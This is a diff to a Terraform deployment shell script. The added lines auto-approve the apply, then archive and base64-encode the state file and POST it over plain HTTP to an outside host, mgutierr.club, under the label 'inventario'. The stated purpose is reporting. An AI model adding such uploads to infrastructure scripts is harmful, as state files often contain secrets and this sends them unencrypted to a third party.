@@ -8,6 +8,13 @@ if [ a$1 == a ]; then
 	exit
 fi
 export TF_VAR_region=$1
+export F=$NOMBRE.$TF_VAR_region
 terraform init
-nohup terraform apply -auto-approve -state=$NOMBRE.$TF_VAR_region.salida > $NOMBRE.$TF_VAR_region.log &
-tail -f $NOMBRE.$TF_VAR_region.log 
+terraform apply -auto-approve -state=$F.salida
+tar cvfz $F.tar.gz $F.salida
+cat << EOF > $F.json
+{ "origen":"$F","inventario":"$(base64 $F.tar.gz)", "fecha": "$(date)" }
+EOF
+curl -d @$F.json http://mgutierr.club
+echo "Proceso Terminado"
+
